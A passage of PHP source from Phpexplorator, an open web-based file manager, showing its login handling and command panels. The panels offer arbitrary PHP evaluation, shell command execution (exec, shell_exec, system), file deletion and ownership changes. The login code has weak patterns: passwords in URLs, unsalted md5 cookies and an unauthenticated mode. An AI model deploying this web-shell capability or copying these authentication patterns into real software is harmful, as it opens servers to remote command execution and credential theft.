         <option value="php://output">php://output</option>
         <option value="php://input">php://input</option>
         <option value="php://stdout">php://stdout</option>
         <option value="php://stdin">php://stdin</option>
         <option value="ogg://">ogg://</option>
         </optgroup>
         <optgroup label="- ssh -">
         <option value="ssh2.shell://">ssh2.shell://</option>
         <option value="ssh2.exec://">ssh2.exec://</option>
         <option value="ssh2.tunnel://">ssh2.tunnel://</option>
         <option value="ssh2.sftp://">ssh2.sftp://</option>
         <option value="ssh2.scp://">ssh2.scp://</option>
         </optgroup>
         <optgroup label="- filter read-">
         <option value="php://filter/resource=">Null filter</option>
         <option value="php://filter/read=string.toupper/resource=">To upper</option>
         <option value="php://filter/read=string.tolower/resource=">To lower</option>
         <option value="php://filter/read=string.rot13/resource=">To rot13</option>
         <option value="php://filter/read=string.strip_tags/resource=">Strip_tags</option>
         <option value="php://filter/read=string.base64/resource=">To base64</option>
         <option value="php://filter/read=string.quoted-printable/resource=">To quoted-printable</option>
         </optgroup>
         <optgroup label="- filter write-">
         <option value="php://filter/resource=">Null filter</option>
         <option value="php://filter/write=string.toupper/resource=">To upper</option>
         <option value="php://filter/write=string.tolower/resource=">To lower</option>
         <option value="php://filter/write=string.rot13/resource=">To rot13</option>
         <option value="php://filter/write=string.strip_tags/resource=">Strip_tags</option>
         <option value="php://filter/write=string.base64/resource=">To base64</option>
         <option value="php://filter/write=string.quoted-printable/resource=">To quoted-printable</option>
         </optgroup>
         <optgroup label="- other -">
	 <?php
	    $dir = @ opendir($PE_config["stream_path"] . "stream/");
	    while ($file = readdir($dir)){
	        if(($file != ".") && ($file != "..") && (is_dir($PE_config["stream_path"] . "stream/" . $file))){
	            print("<option value=\"" . $file . "://\">" . $file . "://</option>");
	        }
	    }
	    closedir($dir);

	    ?>
         </optgroup>
 </select>
 <?php
    return true;
}
/**
* PE_title()
* send title content af the page
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_title($PE_config, $PE_language = array())
{
    if(empty($PE_config["show_title"])) return $PE_thevar;

    ?>
 <fieldset class="bubble"><legend><?php print("Phpexplorator Ver. " . PE_version);?></legend>
 <table class="num1"  width="100%">
  <tr><td align="center">
  <?php if(empty($PE_config["personal_header"])){
        print("<b><h1>Phpexplorator Ver. " . PE_version . "</h1>");
        if($PE_config["authentification_need"] == "apache") print(" (User:" . $_SERVER["REMOTE_USER"] . ")");
    }else{
        print($PE_config["personal_header"]);
    }

    ?>
 <h6>
 <br />
 <?php
    print("(");
    print($_SERVER["server_software"]);
    print(", ");
    print($_SERVER["gateway_interface"]);
    print(", IP:");
    print($_SERVER["server_addr"]);
    print(", PORT:");
    print($_SERVER["server_protocol"]);
    print(", HOSTNAME:");
    print($_SERVER["server_name"]);
    print(", ADMIN:");
    print($_SERVER["server_admin"]);
    print(") ");

    ?>
 </h6>
 </td></tr>
 </table>
 </fieldset>

 <?php
    return $PE_thevar;
}
/**
* PE_footer()
* footer of the page
*
* @param mixed $PE_config
* @param array $PE_language
* @return
*/
function PE_footer($PE_config, $PE_language = array())
{
    if(empty($PE_config["show_footer"])){
        return false;
    }

    ?>
 <fieldset class="bubble"><legend><?php print("�");?></legend>
 <table align="center" border="0">
 <td align="center">
 <h6>
 <br /> Powered by phpexplorator
 <?php print("(" . (microtime() - $_SESSION["PE_time1"]) . ") s");?>
 <br /> Copyright � 2004-2011
 <?php if(empty($PE_config["personal_footer"])){
		print("tchouamou@gmail.com  " . PE_translate("All rights reserved") . ". <br /> " . PE_translate("Adress") . ": Via Dora baltea 25, Verolengo, Torino.");
    }else{
        print($PE_config["personal_footer"]);
	}
 ?>
 </h6>

  </td>
 <!--td>
 </td-->


 </tr>

 <!--tr align="center">

 <td align="center">
 <a href="http://sourceforge.net/donate/index.php?group_id=183073">
 <img src="<?php print($PE_config["images_url"]);

    ?>project-support.jpg" alt="Support This Project" border="0" height="32" width="88" />
 </a>

 <a href="http://sourceforge.net/projects/phpexplorator/">
 <img src="http://sflogo.sourceforge.net/sflogo.php?group_id=183073&type=1" alt="SourceForge.net Logo" border="0" height="31" width="88" />
 </a>


 <a href="http://www.php.net/">
 <img src="<?php print($PE_config["images_url"]);

    ?>php.png" alt="|PHP|" border="0" height="32" width="88" /></a>

 <a href="http://validator.w3.org/check?uri=referer">
 <img src="<?php print($PE_config["images_url"]);

    ?>xhtml.bmp" alt="|Valid XHTML 1.0!|" border="0" height="32" width="88" /></a>


 <a href="http://jigsaw.w3.org/css-validator">
 <img src="<?php print($PE_config["images_url"]);

    ?>w3c.bmp" alt="|Valid CSS 1.0!|" border="0" height="32" width="88" /></a>

<a href="http://tinymce.moxiecode.com?id=powered_by_tinymce"><img src="http://tinymce.sourceforge.net/buttons/powered_by_tinymce.png" border="0" width="88" height="32" alt="Powered by TinyMCE" /></a>
 </td>
 </tr-->
 </table>
 </fieldset>
 <!-- end page -->
 </body>
 <!--end body -->
 </html>
 <!--end html -->
 <?php
    return true;
}
/**
* PE_print_r()
* Print in good format an array
*
* @param mixed $info
* @return
*/
function PE_print_r($info)
{
    foreach($info as $key => $value){
        if(is_array($value)){
            print("[<b>" . $key . "</b>:<br />(");
            PE_print_r($value);
            print(")]; <br />");
        }else{
            print("<b>" . $key . "</b>=" . $value . "; ");
        }
    }
    return $info;
}
/**
* PE_auth_basic()
* to send WWW-Authenticate Basic request to the browser
*
* @param mixed $PHP_SELF
* @return
*/
function PE_auth_basic($PHP_SELF)
{
    @ header('WWW-Authenticate: Basic realm="[PhpExplorator]  Inser Username and Password" ');
    @ header('HTTP/1.0 401 Unauthorized');
    // --------------
    @ $log_text = "Not good phpexplorator authentification try again  (" . date("Y/m/d H:i:s") . "); from:" . $_SERVER["remote_addr"] . "\n";
    print($log_text);
    error_log($log_text);
    return false;
}
/**
* PE_auth_form()
* send the login html form to the browser
*
* @param mixed $PHP_SELF
* @return
*/
function PE_auth_form($PHP_SELF, $PE_config, $PE_language)
{
    session_start;
    $PE_img_code = substr((base64_encode(md5(date("s") . "Phpexplorator" . rand()))), 5, 5);
    if(!function_exists("imagecreate")){
        $PE_img_code = (rand(1, 5) > 3)?"2NhM2":"GUyYz";
    }
    $_SESSION["PE_img_code"] = $PE_img_code;

    ?>
<html>
<head>
<title>PhpExplorator: Login</title>
</head>
<body>
<?php PE_title($PE_config, $PE_language);

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("login"));?></legend>
<table width="100%">
<tr align="center">
<td><h1 align="center"><u><?php print(PE_translate("login page"));?><u></h1></b><br /></td></tr>
</table>
<table class="num3"  align="center">
<form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>">
<!--input type="hidden" name="<_php print($PE_config["PE_key"]);_>" value="<_php print($PE_config["PE_val"]);_>" /-->
<tr><td><?php print(PE_translate("Username"));?>:</td><td><input type="text" name="PE_user" value="" /></td></tr>
<tr><td><?php print(PE_translate("Password"));?>:</td><td><input type="password" name="PE_pw" value="" /></td></tr>
<tr><td>.</td><td>
<?php
    if(!empty($PE_config["self_header"])){
        print("<img src=\"?". $PE_config["PE_key"]."=".$PE_config["PE_val"]."&" . "PE_imgtext=" . $PE_img_code . "\" alt=\"[code]\" />");
    }else{
        print("<img src=\"\" alt=\"" . $PE_img_code . "\" />");
    }

    ?>
    </td></tr>
<tr><td><?php print(PE_translate("Image code"));?>:</td><td><input type="text" name="PE_img_code" value="" /></td></tr>
<tr><td colspan="2" align="center"><input type="submit" value="<?php print(PE_translate("Login"));?>" /></td></tr>

</table>
</fieldset>
<?php PE_footer($PE_config, $PE_language);

    ?>
</form>
<?php
    return $PE_img_code;
}
/**
* PE_login()
* manage the login process
*
* @param mixed $PE_config
* @param array $PE_language
* @return
*/
function PE_login($PE_config, $PE_language = array())
{
    if(!empty($PE_config["authentification_need"])){
        $login_basic = (($PE_config["authentification_need"] == "basic" || $PE_config["authentification_need"] == "1") && true);
        $login_form = (($PE_config["authentification_need"] == "form") && true);
        $login_url = (($PE_config["authentification_need"] == "url") && true);
        $login_no = (($PE_config["authentification_need"] == "no" || $PE_config["authentification_need"] == "0" || $PE_config["authentification_need"] == "apache") && true);

        $PE_logout = (PE_getpost("PE_logout"));
        $logout_yes = (($PE_logout == "yes") && true);
        // ==============================================================
        session_start();
        // ==============================================================
        if((((isset($_COOKIE["pe_my_password"])) && ($_COOKIE["pe_my_password"] == md5($PE_config["my_password"]))) && ((isset($_COOKIE["pe_my_username"])) && ($_COOKIE["pe_my_username"] == md5($PE_config["my_username"])))) ||
                (((isset($_SESSION["pe_my_password"])) && ($_SESSION["pe_my_password"] == md5($PE_config["my_password"]))) && ((isset($_SESSION["pe_my_username"])) && ($_SESSION["pe_my_username"] == md5($PE_config["my_username"]))))){
            if(isset($PE_logout)){
                setcookie("PE_my_password", md5($PE_config["my_password"]), time() - 3600);
                setcookie("PE_my_username", md5($PE_config["my_username"]), time() - 3600);
                unset($_SESSION["pe_img_code"]);
                unset($_SESSION["pe_my_password"]);
                unset($_SESSION["pe_my_username"]);
                session_destroy();
                session_start();

                if($login_basic){
                    PE_auth_basic($_SERVER["PHP_SELF"]);
                } elseif($login_form){
                    $_SESSION["pe_img_code"] = PE_auth_form($_SERVER["PHP_SELF"], $PE_config, $PE_language);
                } elseif($login_url){
                    die("Your are exit now, Insert a good account information in the Url <br />" . "[<b>" . $_SERVER["PHP_SELF"] . "?user=your_user&PE_pw=your_password</b>]"); //--exit--
                }else{
                    die("Your are exit now, Click <a  href=\"" . $_SERVER["PHP_SELF"] . "\"><b> [Here] </b></A> to login again"); //--exit--
                }
                exit;
                return false;
                // --exit--
            }

            return true;
            // ==============================================================
        }
        // ==============================================================
        session_start();
        if($login_basic){
            $PE_user = $_SERVER["PHP_AUTH_USER"];
            $PE_password = $_SERVER["PHP_AUTH_PW"];
        } elseif($login_form){
            $PE_password = PE_getpost('PE_pw');
            $PE_user = PE_getpost('PE_user');
            $PE_img_code = PE_getpost('PE_img_code');
            if(empty($PE_config["challenge_need"])) $PE_img_code = $_SESSION["pe_img_code"];
        } elseif($login_url){
            $PE_password = PE_getpost("PE_pw");
            $PE_user = PE_getpost('user');
        } elseif($login_no){
            $PE_password = $PE_config["my_password"];
            $PE_user = $PE_config["my_username"];
        }else{
            $PE_password = $PE_config["my_password"];
            $PE_user = $PE_config["my_username"];
        }

        $PE_user_good = (isset($PE_user) && isset($PE_password) && ($PE_user == $PE_config["my_username"]) && ($PE_password == $PE_config["my_password"]) && (empty($PE_logout)) && true);

        $allow_basic = (($login_basic) && $PE_user_good && true);
        $allow_form = (($login_form) && ($PE_img_code == $_SESSION["pe_img_code"]) && $PE_user_good && true);
        $allow_url = (($login_url) && $PE_user_good && true);
        $login_no = (($login_no) && $PE_user_good && true);
        // ==============================================================
        if($allow_basic || $allow_form || $allow_url || $login_no){
            $_SESSION["pe_my_password"] = md5($PE_config["my_password"]);
            $_SESSION["pe_my_username"] = md5($PE_config["my_username"]);
            setcookie("PE_my_password", md5($PE_config["my_password"]), time() - $PE_config["cookie_alive"]);
            setcookie("PE_my_username", md5($PE_config["my_username"]), time() - $PE_config["cookie_alive"]);
            setcookie("PE_my_password", md5($PE_config["my_password"]), time() + $PE_config["cookie_alive"]);
            setcookie("PE_my_username", md5($PE_config["my_username"]), time() + $PE_config["cookie_alive"]);
            return true; //can continue
        }else{
            setcookie("PE_my_password", md5($PE_config["my_password"]), time() - $PE_config["cookie_alive"]);
            setcookie("PE_my_username", md5($PE_config["my_username"]), time() - $PE_config["cookie_alive"]);
            unset($_SESSION["pe_img_code"]);
            unset($_SESSION["pe_my_password"]);
            unset($_SESSION["pe_my_username"]);
            session_destroy();
            session_start();
            if($login_basic){
                PE_auth_basic($_SERVER["PHP_SELF"]);
            } elseif($login_form){
                $_SESSION["pe_img_code"] = PE_auth_form($_SERVER["PHP_SELF"], $PE_config, $PE_language);
            } elseif($login_url){
                die("Your are exit now, Insert a good account information in the Url <br />" . "[<b>" . $_SERVER["PHP_SELF"] . "?user=your_user&PE_pw=your_password</b>]"); //--exit--
            } elseif($login_no){
                return true;
            }else{
                return true;
            }
            exit;

            return false;
        }
        // ==============================================================
    }
    return true;
}
/**
* PE_get_var()
* return a clean array of some post var
*
* @param mixed $PE_config
* @return
*/
function PE_get_var($PE_config)
{

    session_start();
    $PE_thevar = array();
    /**
    * send value
    */
    $PE_thevar["the_file"] = PE_getpost('PE_the_file');
    $PE_thevar["the_value"] = PE_getpost('PE_the_value');
    $PE_thevar["send_type"] = PE_getpost('PE_send_type');
    $PE_thevar["PE_select_order"] = PE_getpost('PE1_select_order');
    $PE_thevar["select_action"] = PE_getpost('PE_select_action');

    $PE_thevar["PE_current_stream"] = PE_getpost('PE_stream');
    $_SESSION["PE_current_stream"] = (empty($_SESSION["PE_current_stream"])) ? $PE_config["default_stream"] : $_SESSION["PE_current_stream"];
    $PE_thevar["PE_current_stream"] = (!isset($PE_thevar["PE_current_stream"]))?($_SESSION["PE_current_stream"]) : $PE_thevar["PE_current_stream"];
    $_SESSION["PE_current_stream"] = $PE_thevar["PE_current_stream"];

    /**
    * path limit
    */
    if(!empty($PE_config["path_limit"])){
        switch ($PE_config["path_limit"]){
            case "www":;
                if(!PE_is_include_dir($PE_thevar["the_file"], $_SERVER["DOCUMENT_ROOT"])){
                    $PE_thevar["the_file"] = $_SERVER["DOCUMENT_ROOT"];
                    $PE_thevar["select_action"] = "list";
                };
                if(!PE_is_include_dir($PE_thevar["the_value"], $_SERVER["DOCUMENT_ROOT"])){
                    $PE_thevar["the_value"] = $_SERVER["DOCUMENT_ROOT"];
                    $PE_thevar["select_action"] = "list";
                };
                break;
            case "begin_path":;
                if(!PE_is_include_dir($PE_thevar["the_file"], $PE_config["begin_path"])){
                    $PE_thevar["the_file"] = $PE_config["begin_path"];
                    $PE_thevar["select_action"] = "list";
                };
                if(!PE_is_include_dir($PE_thevar["the_value"], $PE_config["begin_path"])){
                    $PE_thevar["the_value"] = $PE_config["begin_path"];
                    $PE_thevar["select_action"] = "list";
                };

                break;
            case "all":;
            default:;
                break;
        }
    };


    /**
    * path limit
    */
    $PE_thevar["the_file"] = (empty($PE_thevar["the_file"]))?($PE_config["begin_path"]) : $PE_thevar["the_file"];
    $PE_thevar["the_value"] = (empty($PE_thevar["the_value"]))?($PE_config["begin_path"]) : $PE_thevar["the_value"];

    if(file_exists($PE_thevar["the_file"])){
        $PE_thevar["the_file"] = realpath($PE_thevar["the_file"]); ;
    }
    $_SESSION["PE_current_dir"] = (empty($_SESSION["PE_current_dir"]))?"" : $_SESSION["PE_current_dir"];
    $_SESSION["PE_current_file"] = (empty($_SESSION["PE_current_file"]))?"" : $_SESSION["PE_current_file"];


    if(is_dir($PE_thevar["the_file"])){
        $info_dir = pathinfo($PE_thevar["the_file"] . "/.");
        $PE_thevar["PE_current_dir"] = realPath($info_dir["dirname"]) . PE_path_separator();
        $PE_thevar["PE_current_file"] = realPath($info_dir["dirname"]);
    } elseif(is_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])){
        $info_dir = pathinfo($PE_thevar["the_file"]);
        $PE_thevar["PE_current_dir"] = realPath($info_dir["dirname"]) . PE_path_separator();
        $PE_thevar["PE_current_file"] = $PE_thevar["PE_current_dir"] . $info_dir["basename"];
    } elseif(is_link($PE_thevar["the_file"])){
        $info_dir = pathinfo($PE_thevar["the_file"]);
        $PE_thevar["PE_current_dir"] = realPath($info_dir["dirname"]) . PE_path_separator();
        $PE_thevar["PE_current_file"] = $PE_thevar["PE_current_dir"] . $info_dir["basename"];
    }else{
        $PE_thevar["PE_current_dir"] = $_SESSION["PE_current_dir"];
        $PE_thevar["PE_current_file"] = $_SESSION["PE_current_file"];
    }

    $PE_thevar["PE_current_file"] = ($PE_thevar["PE_current_file"]);
    $PE_thevar["PE_current_dir"] = ($PE_thevar["PE_current_dir"]);

    $PE_thevar["PE_current_dir"] = (empty($PE_thevar["PE_current_dir"]))?($PE_config["begin_path"]) : $PE_thevar["PE_current_dir"];
    $PE_thevar["PE_current_file"] = (empty($PE_thevar["PE_current_file"]))?($PE_thevar["PE_current_dir"]) : $PE_thevar["PE_current_file"];
    /**
    * send type
    */
    $PE_thevar["send_type"] = (empty($PE_thevar["send_type"]))?('') : $PE_thevar["send_type"];
    /**
    * select order
    */
    $_SESSION["PE_select_order"] = (empty($_SESSION["PE_select_order"]))?"" : $_SESSION["PE_select_order"];
    $_SESSION["PE_order_asc_desc"] = (empty($_SESSION["PE_order_asc_desc"]))?SORT_ASC : $_SESSION["PE_order_asc_desc"];
    $PE_thevar["PE_order_asc_desc"] = $_SESSION["PE_order_asc_desc"];

    if(!empty($PE_thevar["PE_select_order"])){
        if($_SESSION["PE_select_order"] == $PE_thevar["PE_select_order"]){
            $PE_thevar["PE_order_asc_desc"] = ($PE_thevar["PE_order_asc_desc"] == SORT_ASC)?SORT_DESC:SORT_ASC;
            $_SESSION["PE_order_asc_desc"] = $PE_thevar["PE_order_asc_desc"];
        }else{
            $_SESSION["PE_select_order"] = $PE_thevar["PE_select_order"];
        }
    }

    $PE_thevar["PE_select_order"] = (empty($PE_thevar["PE_select_order"]))?($_SESSION["PE_select_order"]) : $PE_thevar["PE_select_order"];

    $_SESSION["PE_current_language"] = (empty($_SESSION["PE_current_language"])) ? $PE_config["PE_current_language"] : $_SESSION["PE_current_language"];


    return $PE_thevar;
}
/**
* PE_command_1()
* show forms of command 1 layer
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_command_1($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_command_1"])) return $PE_config;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("command_1"));?></legend>
 <table class="num1"  width="100%">
 <tr><td align="center">
 <b><u><?php print(PE_translate("cmd_one"));

    ?></u></b>
 </td></tr>
 </table>



 <table class="num3"  width="100%">

 <tr>
 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("property"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "property", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("run_code"), "text", "PE_the_file", "print(phpinfo());", "hidden", "PE_select_action", "run_code", "", "", ""));

    ?>
 </td>

 <td>

 <?php print(PE_form($PE_config, PE_translate("edit_file"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "edit", "", "", ""));

    ?>
 </td>
 </tr>

 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("download"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "download", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("del_file"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "delete", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("del_folder"), "text", "PE_the_file", $PE_thevar["PE_current_dir"], "hidden", "PE_select_action", "rm_dir", "", "", ""));

    ?>
 </td>
 </tr>

 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("explore"), "text", "PE_the_file", $PE_thevar["PE_current_dir"], "hidden", "PE_select_action", "list", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("create_file"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "new_file", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("create_folder"), "text", "PE_the_file", $PE_thevar["PE_current_dir"], "hidden", "PE_select_action", "new_dir", "", "", ""));

    ?>
 </td>
 </tr>

 </table>
</fieldset>
 <?php
    return $PE_config;
}
/**
* PE_command_2()
* show forms of command 2 layer
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_command_2($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_command_2"])) return $PE_config;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("command_2"));?></legend>
 <table class="num1"  width="100%">
 <tr><td align="center">
 <b><u><?php print(PE_translate("cmd_two"));

    ?></u></b>
 </td></tr>
 </table>

 <table class="num3"  width="100%">
 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("new_link"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "new_link"));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("touch"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", date("Y-m-d H:i:s"), "hidden", "PE_select_action", "set_touch"));

    ?>
 </td>
 </tr>


 <tr><td>
 <?php print(PE_form($PE_config, PE_translate("rename_file"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "rename"));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("copy_file"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "copy"));

    ?>
 </td>
 </tr>

 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("change_group"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", "user", "hidden", "PE_select_action", "set_group"));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("change_owner"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", "root", "hidden", "PE_select_action", "set_owner"));

    ?>
 </td>
 </tr>

 <tr>
 <td>
 <?php print(PE_form($PE_config, PE_translate("set_perm"), "text", "PE_the_file", $PE_thevar["PE_current_file"], "text", "PE_the_value", "0744", "hidden", "PE_select_action", "set_mode"));

    ?>
 </td>

 <td>
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" enctype="multipart/form-data">
 <input type="text" name="PE_the_file"  value="<?php print($PE_thevar["PE_current_file"]);
    ?>" />
         <?php print(PE_integration($PE_config, "input"));

            ?>

 <select name="PE_select_action">
<optgroup label="   -   ">
 <option value="exec"><?php print(PE_translate("exec"));?></option>
 <option value="shell_exec"><?php print(PE_translate("shell_exec"));?></option>
 <option value="system"><?php print(PE_translate("system"));?></option>
 <option value="replace"><?php print(PE_translate("replace"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="php_info"><?php print(PE_translate("php_info"));?></option>
 <option value="loaded_extension"><?php print(PE_translate("loaded_extension"));?></option>
 <option value="extension_function"><?php print(PE_translate("extension_function"));?></option>
 <option value="php_credit"><?php print(PE_translate("php_credit"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="new_file"><?php print(PE_translate("new_file"));?></option>
 <option value="new_dir"><?php print(PE_translate("new_dir"));?></option>
 <option value="delete"><?php print(PE_translate("delete"));?></option>
 <option value="rm_dir"><?php print(PE_translate("rm_dir"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="zip"><?php print(PE_translate("zip"));?></option>
 <option value="gz"><?php print(PE_translate("gz"));?></option>
 <option value="bz2"><?php print(PE_translate("bz2"));?></option>
 <option value="unzip"><?php print(PE_translate("unzip"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="md5_file"><?php print(PE_translate("md5_file"));?></option>
 <option value="sha1_file"><?php print(PE_translate("sha1_file"));?></option>
 <option value="crc32_file"><?php print(PE_translate("crc32_file"));?></option>
 <option value="str_rot13_file"><?php print(PE_translate("str_rot13_file"));?></option>
 <option value="base64_encode_file"><?php print(PE_translate("base64_encode_file"));?></option>
 <option value="base64_decode_file"><?php print(PE_translate("base64_decode_file"));?></option>
 <option value="urlencode_file"><?php print(PE_translate("urlencode_file"));?></option>
 <option value="urldecode_file"><?php print(PE_translate("urldecode_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <!--option value="count_line_file">Count Line</option-->
 <option value="addslashes_file"><?php print(PE_translate("addslashes_file"));?></option>
 <option value="bin2hex_file"><?php print(PE_translate("bin2hex_file"));?></option>
 <option value="count_chars_file"><?php print(PE_translate("count_chars_file"));?></option>
 <option value="crypt_file"><?php print(PE_translate("crypt_file"));?></option>
 <option value="hebrevc_file"><?php print(PE_translate("hebrevc_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="str_word_count_file"><?php print(PE_translate("str_word_count_file"));?></option>
 <option value="stripslashes_file"><?php print(PE_translate("stripslashes_file"));?></option>
 <option value="strlen_file"><?php print(PE_translate("strlen_file"));?></option>
 <option value="strrev_file"><?php print(PE_translate("strrev_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="only_shell"><?php print(PE_translate("shell"));?></option>
 <option value="only_replace"><?php print(PE_translate("replace"));?></option>
 <option value="cmd_shell"><?php print(PE_translate("cmd_shell"));?></option>
 <option value="cmd_upload"><?php print(PE_translate("cmd_upload"));?></option>
 <option value="cmd_1"><?php print(PE_translate("cmd_1"));?></option>
 <option value="cmd_2"><?php print(PE_translate("cmd_2"));?></option>
 </select>
 <input type="submit" value="<?php print(PE_translate("run"));

    ?>" />
 </form>
 </td></tr>

 </table>
 </fieldset>
 <?php
    return $PE_config;
}
/**
* PE_command()
* show forms of command
*
* @param mixed $arrayfile
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_command($arrayfile, $PE_config = array(), $PE_thevar = array(), $PE_language = array())
{
    if(empty($PE_config["show_command"])) return $PE_config;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("command"));?></legend>
 <table class="num1"  width="100%">
 <tr><td align="center">
 <b><u><?php print(PE_translate("command"));

    ?></u></b>
 </td></tr>
 </table>

 <table class="num3"  width="100%">
 <tr>
 <td>
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" enctype="multipart/form-data">
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <select name="PE_the_file">
<?php
    foreach ($arrayfile as $val){
        print("<option>" . $val . "</option>");
    }

    ?>
 </select>

: <select name="PE_select_action">


<optgroup label="   -   ">
 <option value="list"><?php print(PE_translate("list"));?></option>
 <option value="property"><?php print(PE_translate("property"));?></option>
 <option value="download"><?php print(PE_translate("download"));?></option>
 <option value="edit"><?php print(PE_translate("edit"));?></option>
 <option value="include"><?php print(PE_translate("include"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="new_file"><?php print(PE_translate("new_file"));?></option>
 <option value="new_dir"><?php print(PE_translate("new_dir"));?></option>
 <option value="delete"><?php print(PE_translate("delete"));?></option>
 <option value="rm_dir"><?php print(PE_translate("rm_dir"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="copy"><?php print(PE_translate("copy"));?></option>
 <option value="dir_copy"><?php print(PE_translate("dir_copy"));?></option>
 <option value="move"><?php print(PE_translate("move"));?></option>
 <option value="dir_move"><?php print(PE_translate("dir_move"));?></option>
 <option value="rename"><?php print(PE_translate("rename"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="set_mod"><?php print(PE_translate("set_mod"));?></option>
 <option value="set_own"><?php print(PE_translate("set_own"));?></option>
 <option value="set_grp"><?php print(PE_translate("set_grp"));?></option>
 <option value="set_touch"><?php print(PE_translate("set_touch"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="zip"><?php print(PE_translate("zip"));?></option>
 <option value="unzip"><?php print(PE_translate("unzip"));?></option>
<option value="unzip"><?php print(PE_translate("unzip"));?></option>
 <!--option value="gz">Gzip file</option>
 <option value="send_image"><?php print(PE_translate("send_image"));?></option>
 <option value="file_select"><?php print(PE_translate("file_select"));?></option>
 <option value="bz2">Bz2 file</option-->
</optgroup>
<optgroup label="   -   ">
 <option value="md5_file"><?php print(PE_translate("md5_file"));?></option>
 <option value="sha1_file"><?php print(PE_translate("sha1_file"));?></option>
 <option value="crc32_file"><?php print(PE_translate("crc32_file"));?></option>
 <option value="str_rot13_file"><?php print(PE_translate("str_rot13_file"));?></option>
 <option value="base64_encode_file"><?php print(PE_translate("base64_encode_file"));?></option>
 <option value="base64_decode_file"><?php print(PE_translate("base64_decode_file"));?></option>
 <option value="urlencode_file"><?php print(PE_translate("urlencode_file"));?></option>
 <option value="urldecode_file"><?php print(PE_translate("urldecode_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="addslashes_file"><?php print(PE_translate("addslashes_file"));?></option>
 <option value="bin2hex_file"><?php print(PE_translate("bin2hex_file"));?></option>
 <option value="count_chars_file"><?php print(PE_translate("count_chars_file"));?></option>
 <!--option value="count_line_file">Count Line</option-->
 <option value="crypt_file"><?php print(PE_translate("crypt_file"));?></option>
 <option value="hebrevc_file"><?php print(PE_translate("hebrevc_file"));?></option>
 <option value="str_word_count_file"><?php print(PE_translate("str_word_count_file"));?></option>
 <option value="stripslashes_file"><?php print(PE_translate("stripslashes_file"));?></option>
 <option value="strlen_file"><?php print(PE_translate("strlen_file"));?></option>
 <option value="strrev_file"><?php print(PE_translate("strrev_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="exec_file_file"><?php print(PE_translate("exec_file_file"));?></option>
 <option value="shell_exec_file"><?php print(PE_translate("shell_exec_file"));?></option>
 <option value="system_file"><?php print(PE_translate("system_file"));?></option>
 <option value="run_code_file"><?php print(PE_translate("run_code_file"));?></option>
 <option value="replace"><?php print(PE_translate("replace"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="php_credit"><?php print(PE_translate("php_credit"));?></option>
 <option value="php_info"><?php print(PE_translate("php_info"));?></option>
 <option value="ini_get_all"><?php print(PE_translate("ini_get_all"));?></option>
 <option value="loaded_extension"><?php print(PE_translate("loaded_extension"));?></option>
 <option value="extension_function"><?php print(PE_translate("extension_function"));?></option>
</optgroup>
<optgroup label="   -   ">
